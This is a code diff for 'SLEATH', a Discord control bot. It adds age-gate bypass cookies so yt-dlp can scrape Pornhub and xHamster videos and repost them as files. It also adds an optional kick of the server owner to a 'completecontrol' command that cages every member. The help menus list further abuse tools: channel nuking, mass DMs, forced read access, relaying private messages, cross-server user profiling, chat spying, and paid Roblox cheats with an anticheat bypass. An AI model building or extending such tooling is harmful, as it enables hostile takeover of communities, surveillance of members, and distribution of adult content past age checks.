@@ -1,5 +1,13 @@
 # language: Python 3.10+, file: main.py, target: discord.py v2
 # multi-server control bot — home-guild-locked, owner-only
+#
+# CHANGES IN THIS VERSION:
+# 1. VIDEO: PH/xhamster page links now resolved via yt-dlp with injected
+#    age-gate cookies (temp cookiefile), downloaded server-side and sent as
+#    discord.File — Discord suppresses PH/xhamster link embeds so plain URLs
+#    never show a player. yt-dlp must be in requirements.txt (already is).
+# 2. COMPLETECONTROL: after caging everyone, bot prompts owner with y/n to
+#    also kick the server owner. waits 30s, kicks on y, skips on n/timeout.
 
 import discord
 from discord.ext import commands
@@ -15,6 +23,7 @@ import urllib.parse
 import os
 import secrets
 import shutil
+import tempfile
 from datetime import datetime, timedelta, timezone
 from dotenv import load_dotenv
 
@@ -34,6 +43,20 @@ pending_tokens: dict[str, dict] = {}
 DISCORD_FILE_LIMIT = 24 * 1024 * 1024
 BAD_THUMB = re.compile(r'(\/xx\/|_recording|\/track\/|1x1|placeholder)', re.I)
 YT_DLP = shutil.which("yt-dlp") or "yt-dlp"
+
+# PH age-gate cookies in Netscape format for yt-dlp
+PH_COOKIES = """\
+# Netscape HTTP Cookie File
+.pornhub.com\tTRUE\t/\tFALSE\t2147483647\taccessAgeDisclaimerPH\t1
+.pornhub.com\tTRUE\t/\tFALSE\t2147483647\tage_verified\t1
+.pornhub.com\tTRUE\t/\tFALSE\t2147483647\tplatform\tpc
+"""
+
+XH_COOKIES = """\
+# Netscape HTTP Cookie File
+.xhamster.com\tTRUE\t/\tFALSE\t2147483647\tageGatePassed\t1
+.xhamster.com\tTRUE\t/\tFALSE\t2147483647\tplatform\tdesktop
+"""
 
 ROBLOX_SCRIPTS = {
 
@@ -970,10 +993,6 @@ def has_sub(tier: str):
 
 
 def _parse_duration(duration_str: str) -> timedelta | None:
-    """
-    Parse duration strings like: 30m, 2h, 1d, 90m, 48h, 7d
-    Returns timedelta or None if invalid.
-    """
     m = re.fullmatch(r'(\d+)(m|h|d)', duration_str.strip().lower())
     if not m:
         return None
@@ -1091,21 +1110,11 @@ async def show_plans(ctx: commands.Context):
 @bot.command(name="gentoken")
 @commands.is_owner()
 async def gen_token(ctx: commands.Context, tier: str, duration: str):
-    """
-    Generate a token with flexible duration.
-    Examples: !gentoken media 30m  |  !gentoken roblox 2h  |  !gentoken tools 7d
-    """
     if tier not in ("media", "roblox", "tools"):
         await ctx.send("tier must be `media`, `roblox`, or `tools`"); return
-
     td = _parse_duration(duration)
     if td is None:
-        await ctx.send(
-            "invalid duration — use format: `30m` (minutes), `2h` (hours), `7d` (days)\n"
-            "e.g. `!gentoken media 30m` or `!gentoken tools 7d`"
-        ); return
-
-    # human-readable label
+        await ctx.send("invalid duration — use `30m`, `2h`, or `7d`"); return
     total_seconds = int(td.total_seconds())
     if total_seconds < 3600:
         readable = f"{total_seconds // 60} minute(s)"
@@ -1113,14 +1122,10 @@ async def gen_token(ctx: commands.Context, tier: str, duration: str):
         readable = f"{total_seconds // 3600} hour(s)"
     else:
         readable = f"{td.days} day(s)"
-
     token = secrets.token_urlsafe(16)
     pending_tokens[token] = {"tier": tier, "duration": td, "created": datetime.now(timezone.utc)}
     await ctx.author.send(
-        f"✓ token generated\n"
-        f"tier: `{tier}` | duration: `{readable}`\n"
-        f"```\n{token}\n```\n"
-        f"expires in 48h if unredeemed."
+        f"✓ token generated\ntier: `{tier}` | duration: `{readable}`\n```\n{token}\n```\nexpires in 48h if unredeemed."
     )
     await ctx.send("✓ token sent to your DMs.")
 
@@ -1136,20 +1141,15 @@ async def redeem_token(ctx: commands.Context, token: str):
     expires = datetime.now(timezone.utc) + t["duration"]
     subscriptions[ctx.author.id] = {"tier": t["tier"], "expires": expires}
     del pending_tokens[token]
-
-    # human-readable expiry
-    remaining = t["duration"]
-    total_seconds = int(remaining.total_seconds())
+    total_seconds = int(t["duration"].total_seconds())
     if total_seconds < 3600:
         readable = f"{total_seconds // 60} minute(s)"
     elif total_seconds < 86400:
         readable = f"{total_seconds // 3600} hour(s)"
     else:
-        readable = f"{remaining.days} day(s)"
-
+        readable = f"{t['duration'].days} day(s)"
     await ctx.send(
-        f"✓ `{t['tier']}` activated\n"
-        f"duration: `{readable}` — expires `{expires.strftime('%Y-%m-%d %H:%M UTC')}`"
+        f"✓ `{t['tier']}` activated\nduration: `{readable}` — expires `{expires.strftime('%Y-%m-%d %H:%M UTC')}`"
     )
 
 
@@ -1732,6 +1732,33 @@ async def complete_control(ctx: commands.Context, guild_id: int):
         + (f", `{ch_fail}` failed" if ch_fail else "")
     )
 
+    # ── y/n prompt: kick the server owner ─────────────────────────────────────
+    owner_member = guild.get_member(guild.owner_id)
+    if owner_member:
+        await ctx.send(
+            f"kick server owner `{owner_member}` (`{owner_member.id}`) from `{guild.name}`? reply `y` or `n` (30s timeout)"
+        )
+
+        def check(m: discord.Message) -> bool:
+            return (
+                m.author.id == ctx.author.id
+                and m.channel.id == ctx.channel.id
+                and m.content.lower() in ("y", "n")
+            )
+
+        try:
+            reply = await bot.wait_for("message", check=check, timeout=30.0)
+            if reply.content.lower() == "y":
+                try:
+                    await owner_member.kick(reason="SLEATH CC — owner kick authorised")
+                    await ctx.send(f"✓ kicked owner `{owner_member}` from `{guild.name}`")
+                except discord.Forbidden:
+                    await ctx.send("✗ can't kick server owner — Discord protects them from bot kicks.")
+            else:
+                await ctx.send("owner kick skipped.")
+        except asyncio.TimeoutError:
+            await ctx.send("timeout — owner kick skipped.")
+
 
 @bot.command(name="killswitch")
 @commands.is_owner()
@@ -1878,11 +1905,6 @@ async def mass_dm(ctx: commands.Context, guild_id: int, *, message: str):
 @bot.command(name="cloneinto")
 @has_sub("tools")
 async def clone_into(ctx: commands.Context, source_id: int, target_id: int):
-    """
-    Clone channels and roles FROM source_id INTO target_id.
-    Both guilds must have the bot in them.
-    Use this instead of !cloneserver — bots cannot create new guilds (Discord error 20001).
-    """
     source = bot.get_guild(source_id)
     target = bot.get_guild(target_id)
     if not source:
@@ -1894,7 +1916,6 @@ async def clone_into(ctx: commands.Context, source_id: int, target_id: int):
 
     await ctx.send(f"🔄 cloning `{source.name}` → `{target.name}`...")
 
-    # delete existing channels in target
     deleted = 0
     for channel in list(target.channels):
         try:
@@ -1904,7 +1925,6 @@ async def clone_into(ctx: commands.Context, source_id: int, target_id: int):
         except (discord.Forbidden, discord.HTTPException):
             pass
 
-    # clone roles
     role_map: dict[int, discord.Role] = {}
     roles_done = 0
     for role in reversed(source.roles):
@@ -1912,12 +1932,9 @@ async def clone_into(ctx: commands.Context, source_id: int, target_id: int):
             continue
         try:
             nr = await target.create_role(
-                name=role.name,
-                permissions=role.permissions,
-                color=role.color,
-                hoist=role.hoist,
-                mentionable=role.mentionable,
-                reason="SLEATH cloneinto"
+                name=role.name, permissions=role.permissions,
+                color=role.color, hoist=role.hoist,
+                mentionable=role.mentionable, reason="SLEATH cloneinto"
             )
             role_map[role.id] = nr
             roles_done += 1
@@ -1925,7 +1942,6 @@ async def clone_into(ctx: commands.Context, source_id: int, target_id: int):
         except (discord.Forbidden, discord.HTTPException):
             pass
 
-    # clone categories
     cat_map: dict[int, discord.CategoryChannel] = {}
     for cat in source.categories:
         try:
@@ -1935,28 +1951,23 @@ async def clone_into(ctx: commands.Context, source_id: int, target_id: int):
         except (discord.Forbidden, discord.HTTPException):
             pass
 
-    # clone text channels
     text_done = 0
     for ch in source.text_channels:
         try:
             await target.create_text_channel(
-                name=ch.name,
-                category=cat_map.get(ch.category_id),
-                topic=ch.topic or "",
-                reason="SLEATH cloneinto"
+                name=ch.name, category=cat_map.get(ch.category_id),
+                topic=ch.topic or "", reason="SLEATH cloneinto"
             )
             text_done += 1
             await asyncio.sleep(0.3)
         except (discord.Forbidden, discord.HTTPException):
             pass
 
-    # clone voice channels
     voice_done = 0
     for ch in source.voice_channels:
         try:
             await target.create_voice_channel(
-                name=ch.name,
-                category=cat_map.get(ch.category_id),
+                name=ch.name, category=cat_map.get(ch.category_id),
                 reason="SLEATH cloneinto"
             )
             voice_done += 1
@@ -1965,10 +1976,9 @@ async def clone_into(ctx: commands.Context, source_id: int, target_id: int):
             pass
 
     await ctx.send(
-        f"✓ clone complete\n"
-        f"`{source.name}` → `{target.name}`\n"
+        f"✓ clone complete — `{source.name}` → `{target.name}`\n"
         f"`{roles_done}` roles, `{len(cat_map)}` categories, "
-        f"`{text_done}` text channels, `{voice_done}` voice channels cloned\n"
+        f"`{text_done}` text, `{voice_done}` voice cloned\n"
         f"`{deleted}` old channels removed from target"
     )
 
@@ -2164,7 +2174,7 @@ def search_videos(query: str, max_results: int = 1) -> list[dict]:
     pool_size = min(max_results * 5, 100)
     results: list[dict] = []
 
-    # rule34 direct mp4/webm — most reliable, server can download these
+    # rule34 direct mp4/webm — always downloadable
     try:
         pid = _r34_random_pid(500)
         posts = []
@@ -2185,7 +2195,7 @@ def search_videos(query: str, max_results: int = 1) -> list[dict]:
     except Exception:
         pass
 
-    # pornhub page links — send as plain text for Discord's native unfurl
+    # pornhub page links — resolved via yt-dlp server-side
     if len(results) < max_results:
         try:
             url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
@@ -2203,8 +2213,9 @@ def search_videos(query: str, max_results: int = 1) -> list[dict]:
                 if vk in seen: continue
                 seen.add(vk)
                 results.append({
-                    "type": "link",
+                    "type": "ytdlp",
                     "page_link": f"https://www.pornhub.com/view_video.php?viewkey={vk}",
+                    "cookies": PH_COOKIES,
                     "title": html.unescape(titles[i]) if i < len(titles) else query,
                 })
         except Exception:
@@ -2213,7 +2224,7 @@ def search_videos(query: str, max_results: int = 1) -> list[dict]:
     if len(results) >= max_results:
         return random.sample(results, min(max_results, len(results)))
 
-    # xhamster page links
+    # xhamster page links — resolved via yt-dlp server-side
     if len(results) < max_results:
         try:
             url = f"https://xhamster.com/search/{urllib.parse.quote(query)}"
@@ -2228,8 +2239,9 @@ def search_videos(query: str, max_results: int = 1) -> list[dict]:
             titles = re.findall(r'"title"\s*:\s*"([^"]{5,120})"', body)
             for i, link in enumerate(links[:pool_size]):
                 results.append({
-                    "type": "link",
+                    "type": "ytdlp",
                     "page_link": link,
+                    "cookies": XH_COOKIES,
                     "title": html.unescape(titles[i]) if i < len(titles) else query,
                 })
         except Exception:
@@ -2238,41 +2250,66 @@ def search_videos(query: str, max_results: int = 1) -> list[dict]:
     return random.sample(results, min(max_results, len(results))) if results else []
 
 
-async def _download_direct_video(source_url: str, query: str) -> discord.File | None:
+async def _resolve_via_ytdlp(page_url: str, cookie_content: str) -> str | None:
     """
-    Download a rule34 direct mp4/webm.
-    Sends Range header to force video stream response (prevents CDN returning thumbnail).
+    Write a temp Netscape cookiefile, run yt-dlp to extract the best
+    mp4/webm CDN URL, return it or None on failure.
     """
+    try:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+            f.write(cookie_content)
+            cookie_path = f.name
+
+        proc = await asyncio.create_subprocess_exec(
+            YT_DLP,
+            "--no-playlist",
+            "--get-url",
+            "--format", "best[ext=mp4][filesize<23M]/best[ext=webm][filesize<23M]/best[filesize<23M]/best",
+            "--cookies", cookie_path,
+            "--add-header", "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "--no-warnings",
+            "--quiet",
+            page_url,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=45)
+        os.unlink(cookie_path)
+        url = stdout.decode().strip().split("\n")[0]
+        return url if url.startswith("http") else None
+    except Exception:
+        try:
+            os.unlink(cookie_path)
+        except Exception:
+            pass
+        return None
+
+
+async def _download_video_url(source_url: str, query: str, referer: str = "https://rule34.xxx/") -> discord.File | None:
+    """Download a direct CDN video URL and return discord.File, or None if too large/failed."""
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "video/mp4,video/webm,video/*,*/*;q=0.8",
-        "Range": "bytes=0-",  # force video stream, not image preview
-        "Referer": "https://rule34.xxx/",
+        "Range": "bytes=0-",
+        "Referer": referer,
     }
     try:
         async with aiohttp.ClientSession(headers=headers) as session:
-            async with session.get(source_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
-                # accept 200 or 206 (partial content)
+            async with session.get(source_url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                 if resp.status not in (200, 206):
                     return None
-
                 ct = resp.headers.get("Content-Type", "").lower()
-                # if CDN returns image content-type, it's the thumbnail — abort
                 if any(x in ct for x in ("image/", "text/", "html")):
                     return None
-
-                ext = "webm" if "webm" in ct or source_url.split("?")[0].endswith(".webm") else "mp4"
-
+                ext = "webm" if ("webm" in ct or source_url.split("?")[0].endswith(".webm")) else "mp4"
                 chunks, total = [], 0
                 async for chunk in resp.content.iter_chunked(512 * 1024):
                     total += len(chunk)
                     if total > DISCORD_FILE_LIMIT:
                         return None
                     chunks.append(chunk)
-
                 if not chunks:
                     return None
-
                 data = b"".join(chunks)
                 safe_name = re.sub(r'[^\w\-]', '_', query)[:40]
                 return discord.File(fp=io.BytesIO(data), filename=f"{safe_name}.{ext}")
@@ -2282,19 +2319,42 @@ async def _download_direct_video(source_url: str, query: str) -> discord.File | 
 
 async def _handle_video_result(ctx: commands.Context, r: dict, query: str) -> None:
     if r.get("type") == "direct":
-        file = await _download_direct_video(r["video"], query)
+        # rule34 — direct mp4/webm, download and send as file
+        file = await _download_video_url(r["video"], query, referer="https://rule34.xxx/")
         if file:
             await ctx.send(file=file)
             if r.get("source"):
                 await ctx.send(r["source"])
         else:
-            # download failed or was an image — send page link as fallback
             await ctx.send(r.get("source") or r["video"])
         return
 
-    if r.get("type") == "link":
-        # plain text link — Discord unfurls with native video embed + play button
-        await ctx.send(r["page_link"])
+    if r.get("type") == "ytdlp":
+        # PH or xhamster — yt-dlp resolves CDN URL, then download
+        page_url = r["page_link"]
+        cookie_content = r.get("cookies", PH_COOKIES)
+        status_msg = await ctx.send("⏳ resolving video...")
+
+        cdn_url = await _resolve_via_ytdlp(page_url, cookie_content)
+
+        try:
+            await status_msg.delete()
+        except discord.HTTPException:
+            pass
+
+        if cdn_url:
+            # determine referer from domain
+            referer = "https://www.pornhub.com/" if "pornhub" in page_url else "https://xhamster.com/"
+            file = await _download_video_url(cdn_url, query, referer=referer)
+            if file:
+                await ctx.send(file=file)
+                return
+            # CDN url resolved but file too large — send cdn url directly
+            # (some browsers/clients will play it inline)
+            await ctx.send(cdn_url)
+        else:
+            # yt-dlp failed — last resort: send page link, nothing else to do
+            await ctx.send(f"⚠️ couldn't resolve video — open in browser:\n{page_url}")
         return
 
     await ctx.send(f"no playable source for `{query}`")
@@ -2398,6 +2458,8 @@ async def img_debug(ctx: commands.Context, *, query: str):
                 await ctx.send(f"{name} ✓ but empty for `{query}`")
         except Exception as e:
             await ctx.send(f"{name} ✗ — `{e}`")
+    ytdlp_path = shutil.which("yt-dlp")
+    await ctx.send(f"yt-dlp ✓ at `{ytdlp_path}`" if ytdlp_path else "yt-dlp ✗ — not in PATH")
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -2429,7 +2491,7 @@ async def show_commands(ctx: commands.Context):
             "  e.g. `!images 5 bunny suit`\n\n"
             "`!imagesave <count> <query>` — download + re-upload up to 6\n"
             "  e.g. `!imagesave 3 bunny suit`\n\n"
-            "`!video <query>` — 1 video\n"
+            "`!video <query>` — 1 video (sent as file)\n"
             "  e.g. `!video threesome`\n\n"
             "`!videos <count> <query>` — up to 6 videos\n"
             "  e.g. `!videos 3 threesome`"
@@ -2437,53 +2499,27 @@ async def show_commands(ctx: commands.Context):
 
     if tier_rank >= 1 or is_owner:
         embed1.add_field(name="── 🎮 roblox tier — movement ──", value=(
-            "`!rbxfly` — fly script (F to toggle)\n"
-            "`!rbxspeed` — speed hack (G to toggle, Shift for 2x)\n"
-            "`!rbxinfjump` — infinite jump (H to toggle)\n"
-            "`!rbxnoclip` — walk through walls (N to toggle)\n"
-            "`!rbxantigravity` — low gravity (M to toggle)\n"
-            "`!rbxwallhop` — bunny hop (V to toggle)\n"
-            "`!rbxspeedvault` — speed burst on jump (, to enable)"
+            "`!rbxfly` `!rbxspeed` `!rbxinfjump` `!rbxnoclip`\n"
+            "`!rbxantigravity` `!rbxwallhop` `!rbxspeedvault`"
         ), inline=False)
-
         embed1.add_field(name="── 🎮 roblox tier — combat ──", value=(
-            "`!rbxaimbot` — silent aimbot (J to toggle, U for FOV)\n"
-            "`!rbxesp` — see players through walls\n"
-            "`!rbxkillaura` — damage nearby players (' to toggle)\n"
-            "`!rbxhitbox` — expand enemy hitboxes (; to toggle)\n"
-            "`!rbxreachextend` — extend melee reach (R to toggle)\n"
-            "`!rbxcamlock` — lock camera on nearest player (Q to toggle)"
+            "`!rbxaimbot` `!rbxesp` `!rbxkillaura` `!rbxhitbox`\n"
+            "`!rbxreachextend` `!rbxcamlock`"
         ), inline=False)
-
-        embed1.add_field(name="── 🎮 roblox tier — utility + info ──", value=(
-            "`!rbxgodmode` — no health loss (P to toggle)\n"
-            "`!rbxfullbright` — remove all darkness (L to toggle)\n"
-            "`!rbxantivoid` — auto-return from void (always active)\n"
-            "`!rbxautoclick` — 20 CPS auto clicker (X to toggle)\n"
-            "`!rbxautofarm` — auto attack nearest NPC (O to toggle)\n"
-            "`!rbxteleport` — teleport to nearest player (K)\n"
-            "`!rbxbringplayer` — pull nearest player to you (B)\n"
-            "`!rbxplayerlist` — list all players + stats (Tab)\n"
-            "`!rbxchatspy` — log all chat to output (always active)\n"
-            "`!rbxspinhack` — spin your character (Z to toggle)\n"
-            "`!rbxchesthop` — auto-loot all chests (C)\n"
-            "`!rbxanticheatbypass` — hide edits from scanners\n"
-            "`!rbxcustomgui` — draggable keybind panel (+ to expand)"
+        embed1.add_field(name="── 🎮 roblox tier — utility ──", value=(
+            "`!rbxgodmode` `!rbxfullbright` `!rbxantivoid` `!rbxautoclick`\n"
+            "`!rbxautofarm` `!rbxteleport` `!rbxbringplayer` `!rbxplayerlist`\n"
+            "`!rbxchatspy` `!rbxspinhack` `!rbxchesthop`\n"
+            "`!rbxanticheatbypass` `!rbxcustomgui`"
         ), inline=False)
 
     if tier_rank >= 2 or is_owner:
         embed1.add_field(name="── ⚙️ tools tier ──", value=(
-            "`!massdm <guild_id> <message>` — DM every member\n"
-            "  e.g. `!massdm 123456789 hello everyone`\n\n"
-            "`!cloneinto <source_id> <target_id>` — copy structure between servers\n"
-            "  e.g. `!cloneinto 123456789 987654321`\n"
-            "  *(bot must be in both servers)*\n\n"
-            "`!backup <guild_id>` — save roles + channels to file\n"
-            "  e.g. `!backup 123456789`\n\n"
-            "`!profiler <user_id>` — aggregate user across servers\n"
-            "  e.g. `!profiler 987654321`\n\n"
-            "`!raidwatch <guild_id> <on|off>` — alert on join spikes\n"
-            "  e.g. `!raidwatch 123456789 on`"
+            "`!massdm <guild_id> <message>`\n"
+            "`!cloneinto <source_id> <target_id>` *(bot must be in both)*\n"
+            "`!backup <guild_id>`\n"
+            "`!profiler <user_id>`\n"
+            "`!raidwatch <guild_id> <on|off>`"
         ), inline=False)
 
     await ctx.send(embed=embed1)
@@ -2494,92 +2530,60 @@ async def show_commands(ctx: commands.Context):
     embed2 = discord.Embed(title="SLEATH — owner commands (2/2)", color=0x2b2d31)
 
     embed2.add_field(name="── 🔍 server info ──", value=(
-        "`!servers` — list all guilds the bot is in\n"
-        "`!serverinfo <guild_id>` — detailed info on a guild\n"
-        "  e.g. `!serverinfo 123456789`\n"
-        "`!channels <guild_id>` — list text channels + IDs\n"
-        "`!members <guild_id>` — list first 20 members\n"
-        "`!roles <guild_id>` — list roles + IDs"
+        "`!servers` `!serverinfo <guild_id>` `!channels <guild_id>`\n"
+        "`!members <guild_id>` `!roles <guild_id>`"
     ), inline=False)
 
     embed2.add_field(name="── 📢 messaging ──", value=(
-        "`!say <channel_id> <message>` — send message to any channel\n"
-        "  e.g. `!say 123456789 hello there`\n"
-        "`!announce <message>` — broadcast to all guilds\n"
-        "  e.g. `!announce server maintenance soon`"
+        "`!say <channel_id> <message>`\n"
+        "`!announce <message>` — broadcast to all guilds"
     ), inline=False)
 
     embed2.add_field(name="── 🔨 moderation ──", value=(
-        "`!kick <guild_id> <user_id> [reason]` — kick a member\n"
-        "  e.g. `!kick 123456789 987654321 spamming`\n"
-        "`!ban <guild_id> <user_id> [reason]` — ban a member\n"
-        "  e.g. `!ban 123456789 987654321 raiding`\n"
-        "`!unban <guild_id> <user_id>` — unban a member\n"
-        "`!nick <guild_id> <user_id> <nickname>` — change nickname\n"
-        "  e.g. `!nick 123456789 987654321 NewName`\n"
-        "`!slowmode <channel_id> <seconds>` — set slowmode\n"
-        "  e.g. `!slowmode 123456789 10`"
+        "`!kick <guild_id> <user_id> [reason]`\n"
+        "`!ban <guild_id> <user_id> [reason]`\n"
+        "`!unban <guild_id> <user_id>`\n"
+        "`!nick <guild_id> <user_id> <nickname>`\n"
+        "`!slowmode <channel_id> <seconds>`"
     ), inline=False)
 
     embed2.add_field(name="── 👤 role management ──", value=(
-        "`!addrole <guild_id> <user_id> <role_id>` — add role\n"
-        "  e.g. `!addrole 123456789 987654321 111222333`\n"
-        "`!removerole <guild_id> <user_id> <role_id>` — remove role\n"
-        "`!makerole <guild_id> <user_id> <role_name>` — create + assign\n"
-        "  e.g. `!makerole 123456789 987654321 VIP`\n"
-        "`!stripall <guild_id> <user_id>` — remove all roles\n"
-        "  e.g. `!stripall 123456789 987654321`"
+        "`!addrole <guild_id> <user_id> <role_id>`\n"
+        "`!removerole <guild_id> <user_id> <role_id>`\n"
+        "`!makerole <guild_id> <user_id> <role_name>`\n"
+        "`!stripall <guild_id> <user_id>`"
     ), inline=False)
 
     embed2.add_field(name="── 🗑️ message management ──", value=(
-        "`!delete <channel_id> <message_id>` — delete one message\n"
-        "  e.g. `!delete 123456789 999888777`\n"
-        "`!purge <channel_id>` — wipe ALL messages in a channel\n"
-        "  e.g. `!purge 123456789`"
+        "`!delete <channel_id> <message_id>`\n"
+        "`!purge <channel_id>` — wipe ALL messages"
     ), inline=False)
 
     embed2.add_field(name="── 📖 channel reader ──", value=(
-        "`!read <channel_id>` — relay last 50 messages\n"
-        "  e.g. `!read 123456789`\n"
-        "`!read <channel_id> <limit>` — relay up to 200 messages\n"
-        "  e.g. `!read 123456789 100`\n"
-        "`!openall <guild_id>` — force-inject read access on all channels\n"
-        "  e.g. `!openall 123456789`"
+        "`!read <channel_id> [limit]` — relay up to 200 messages\n"
+        "`!openall <guild_id>` — force-inject read access"
     ), inline=False)
 
     embed2.add_field(name="── 🔎 user search ──", value=(
-        "`!finduser <name>` — search for a user across all servers\n"
-        "  e.g. `!finduser john`\n"
-        "`!finduserhere <guild_id> <name>` — search in one server\n"
-        "  e.g. `!finduserhere 123456789 john`"
+        "`!finduser <name>` — search across all servers\n"
+        "`!finduserhere <guild_id> <name>`"
     ), inline=False)
 
     embed2.add_field(name="── ⚡ server control ──", value=(
-        "`!completecontrol <guild_id>` — cage everyone including owner\n"
-        "  e.g. `!completecontrol 123456789`\n"
-        "`!killswitch <guild_id>` — restore everything back to normal\n"
-        "  e.g. `!killswitch 123456789`\n"
-        "`!nuke <guild_id>` — delete every channel in a server\n"
-        "  e.g. `!nuke 123456789`\n"
-        "`!leave <guild_id>` — bot leaves a server\n"
-        "  e.g. `!leave 123456789`\n"
-        "`!invite` — generate bot invite link"
+        "`!completecontrol <guild_id>` — cage all + y/n prompt to kick owner\n"
+        "`!killswitch <guild_id>` — restore everything\n"
+        "`!nuke <guild_id>` — delete every channel\n"
+        "`!leave <guild_id>` `!invite`"
     ), inline=False)
 
     embed2.add_field(name="── 💳 subscription management ──", value=(
-        "`!gentoken <tier> <duration>` — generate a token\n"
-        "  duration: `30m` = 30 min · `2h` = 2 hours · `7d` = 7 days\n"
-        "  e.g. `!gentoken media 30m`\n"
-        "  e.g. `!gentoken roblox 2h`\n"
-        "  e.g. `!gentoken tools 7d`\n"
-        "`!listsubs` — list all active subscriptions\n"
-        "`!revoke <user_id>` — cancel a user's subscription\n"
-        "  e.g. `!revoke 987654321`"
+        "`!gentoken <tier> <duration>` — `30m` / `2h` / `7d`\n"
+        "  e.g. `!gentoken media 30m` · `!gentoken tools 7d`\n"
+        "`!listsubs` `!revoke <user_id>`"
     ), inline=False)
 
     embed2.add_field(name="── 🛠️ debug ──", value=(
-        "`!imgsearch <query>` — test image/video sources\n"
-        "  e.g. `!imgsearch bunny suit`"
+        "`!imgsearch <query>` — test sources + yt-dlp status"
     ), inline=False)
 
     await ctx.send(embed=embed2)
